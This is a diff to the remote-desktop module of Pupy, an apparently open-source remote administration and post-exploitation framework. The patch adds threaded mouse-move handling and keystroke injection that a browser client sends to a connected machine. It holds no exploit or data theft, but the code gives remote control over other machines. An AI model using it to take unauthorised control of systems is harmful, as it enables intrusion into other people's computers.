@@ -2,8 +2,7 @@
 # Copyright (c) 2017, Nicolas VERDIER (contact@n1nj4.eu)
 # Pupy is under the BSD 3-Clause license. see the LICENSE file at the root of the project for the detailed licence terms
 
-from pupylib.PupyModule import *
-from pupylib.PupyWeb import *
+from pupylib import *
 import base64
 import subprocess
 import time
@@ -14,17 +13,41 @@ import pyautogui
 __class_name__="RemoteDesktopModule"
 
 class RdesktopWebSocketHandler(WebSocketHandler):
-    def initialize(self, client, refresh_interval, quality):
+    def initialize(self, client, refresh_interval, quality, module):
         self.client=client
         self.width=None
         self.height=None
         self.refresh_interval=refresh_interval
         self.quality=quality
         self.remote_streamer=None
+        self.module=module
+        self.events_thread=None
+        self.stop_events_thread=threading.Event()
+        self.mouse_pos=None
+        self.mouse_lock=threading.Lock()
 
     def on_open(self):
         self.set_nodelay(True)
         pass
+
+    def events_handler(self, mouse_refresh_rate=0.01):
+        """ function to handle events in queue """
+        while not self.stop_events_thread.is_set():
+            try:
+                mp=None
+                with self.mouse_lock:
+                    if self.mouse_pos:
+                        mp=self.mouse_pos
+                        self.mouse_pos=None
+                if mp:
+                    #print "moving to %s"%str(mp)
+                    self.remote_streamer.move(*mp)
+                time.sleep(mouse_refresh_rate)
+            except Exception as e:
+                logging.error(e)
+                break
+
+
     def on_message(self, data):
         js=json.loads(data)
         if js['msg']=="start_stream":
@@ -33,17 +56,18 @@ class RdesktopWebSocketHandler(WebSocketHandler):
         elif js['msg']=="click":
             logging.debug("mouse click at : (%s, %s)"%(js['x'], js['y']))
             self.remote_streamer.click(int(js['x']), int(js['y']))
+        elif js['msg']=="move":
+            with self.mouse_lock:
+                self.mouse_pos=(int(js['x']), int(js['y']))
         elif js['msg']=="keypress":
             key=js['key'] #unicode key
             logging.debug("key press : %s"%key)
             try:
-                if key.lower() in pyautogui.KEYBOARD_KEYS:
-                    key=str(key)
-                    if len(key) > 1:
-                        key=key.lower()
-                    self.remote_streamer.key_press(key)
-                else:
-                    logging.error("Error: unhandled key press: %s"%key)
+                if len(key) > 1:
+                    key=key.lower()
+                    self.remote_streamer.kbd_send(key)
+		else:
+		    self.remote_streamer.kbd_write(key)
             except Exception as e:
                 logging.error(e)
         else:
@@ -60,12 +84,20 @@ class RdesktopWebSocketHandler(WebSocketHandler):
         if self.remote_streamer:
             self.remote_streamer.stop()
         self.remote_streamer=self.client.conn.modules['rdesktop'].VideoStreamer(self.update_video_callback, refresh_interval=self.refresh_interval, quality=self.quality)
+        if self.stop_events_thread:
+            self.stop_events_thread.set()
+            self.stop_events_thread=threading.Event()
         self.remote_streamer.start()
+        self.events_thread=threading.Thread(target=self.events_handler)
+        self.events_thread.daemon=True
+        self.events_thread.start()
         logging.debug("streaming video started")
 
     def on_close(self):
         if self.remote_streamer:
             self.remote_streamer.stop()
+        if self.stop_events_thread:
+            self.stop_events_thread.set()
 
 
 class IndexHandler(RequestHandler):
@@ -80,7 +112,7 @@ class IndexHandler(RequestHandler):
 class RemoteDesktopModule(PupyModule):
     """ Start a remote desktop session using a browser websocket client """
 
-    dependencies = ['mss', 'rdesktop']
+    dependencies = ['mss', 'rdesktop', 'keyboard', 'PIL']
 
     def init_argparse(self):
         self.arg_parser = PupyArgumentParser(prog="rdesktop", description=self.__doc__)
@@ -93,7 +125,7 @@ class RemoteDesktopModule(PupyModule):
     def run(self, args):
         self.web_handlers=[
             (r'/?', IndexHandler, {'client': self.client}),
-            (r'/ws', RdesktopWebSocketHandler, {'client': self.client, 'refresh_interval': args.refresh_interval, 'quality':args.quality}),
+            (r'/ws', RdesktopWebSocketHandler, {'client': self.client, 'refresh_interval': args.refresh_interval, 'quality':args.quality, 'module': self}),
         ]
         url=self.start_webplugin()
         self.success("Web handler started on %s"%url)
